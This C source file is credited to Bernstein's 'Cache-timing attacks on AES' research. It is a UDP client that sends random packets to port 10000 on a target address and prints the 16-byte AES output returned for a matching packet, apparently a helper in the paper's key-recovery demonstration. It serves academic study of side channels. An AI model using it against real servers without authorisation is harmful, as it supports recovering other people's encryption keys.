/**
 * Original code from paper:
 *    Cache-timing attacks on AES
 * By:
 *    Daniel J. BERNSTEIN
 *    Department of Mathematics, Statistics, and Computer Science (M/C 249)
 *    The University of Illinois at Chicago
 *    Chicago, IL 60607–7045
 *    djb@cr.yp.to
 *
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <poll.h>

int main(int argc, char **argv)
{
    struct sockaddr_in server;
    int s;
    char packet[40];
    char response[40];
    struct pollfd p;
    int j;
    if (!argv[1])
        return 100;
    if (!inet_aton(argv[1], &server.sin_addr))
        return 100;
    server.sin_family = AF_INET;
    server.sin_port = htons(10000);
    while ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        sleep(1);
    while (connect(s, (struct sockaddr *)&server, sizeof server) == -1)
        sleep(1);
    for (;;)
    {
        for (j = 0; j < sizeof packet; ++j)
            packet[j] = random();
        send(s, packet, sizeof packet, 0);
        p.fd = s;
        p.events = POLLIN;
        if (poll(&p, 1, 100) <= 0)
            continue;
        while (p.revents & POLLIN)
        {
            if (recv(s, response, sizeof response, 0) == sizeof response)
            {
                if (!memcmp(packet, response, 16))
                {
                    for (j = 0; j < 16; ++j)
                        printf("%02x ", 255 & (unsigned int)response[j + 16]);
                    printf("\n");
                    return 0;
                }
            }
            if (poll(&p, 1, 0) <= 0)
                break;
        }
    }
}